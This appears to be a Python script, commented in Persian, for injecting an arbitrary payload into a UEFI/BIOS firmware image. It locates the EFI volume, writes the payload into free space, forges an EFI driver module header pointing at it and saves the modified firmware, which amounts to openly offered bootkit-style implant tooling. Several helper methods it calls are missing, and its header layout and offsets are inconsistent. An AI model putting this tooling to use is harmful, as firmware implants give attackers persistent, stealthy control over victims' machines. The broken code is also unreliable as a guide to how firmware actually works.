#!/usr/bin/env python3
# ابزار دستکاری فریم‌ور UEFI/BIOS

import struct
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class FirmwareInjector:
    def __init__(self, firmware_path):
        with open(firmware_path, 'rb') as f:
            self.firmware = bytearray(f.read())
        
        self.uefi_guid = b'\x7A\xC7\xB8\xF1\xC0\x4E\xB4\x11\xA2\xF8\x00\xA0\xC9\x69\x72\x3B'
        self.rom_header_offset = 0
        
    def find_uefi_volume(self):
        """یافتن حجم EFI در فریم‌ور"""
        pattern = b'_FVH'
        pos = 0
        while pos < len(self.firmware):
            if self.firmware[pos:pos+4] == pattern:
                self.rom_header_offset = pos - 40
                return pos
            pos += 4
        return -1
    
    def inject_payload(self, payload_path):
        """تزریق پیلود به فریم‌ور"""
        # یافتن حجم EFI
        if self.find_uefi_volume() == -1:
            raise RuntimeError("EFI volume not found")
        
        # خواندن پیلود
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        # یافتن فضای خالی
        free_space = self.find_free_space()
        if free_space < len(payload):
            raise RuntimeError("Not enough free space")
        
        # تزریق پیلود
        self.firmware[free_space:free_space+len(payload)] = payload
        
        # ایجاد ماژول EFI جدید
        self.create_efi_module(free_space, len(payload))
        
        # به‌روزرسانی چک‌سام
        self.update_checksum()
    
    def create_efi_module(self, offset, size):
        """ایجاد ماژول EFI جدید"""
        # ساخت هدر FFS
        ffs_header = struct.pack('<16sHBBIII',
            self.uefi_guid,  # GUID
            0x01,            # Type (EFI_FV_FILETYPE_DRIVER)
            0x00,            # Attributes
            0x00,            # State
            size + 24,       # Size
            0,               # Header checksum (temporary)
            0                # Data checksum (temporary)
        )
        
        # محاسبه چک‌سام هدر
        header_checksum = self.calculate_checksum(ffs_header)
        ffs_header = ffs_header[:20] + bytes([header_checksum]) + ffs_header[21:]
        
        # افزودن به فریم‌ور
        module_offset = self.rom_header_offset - 24
        self.firmware[module_offset:module_offset+24] = ffs_header
        
        # افزودن اشاره‌گر به پیلود
        self.firmware[module_offset+24:module_offset+28] = struct.pack('<I', offset)
    
    def save(self, output_path):
        """ذخیره فریم‌ور اصلاح شده"""
        with open(output_path, 'wb') as f:
            f.write(self.firmware)
            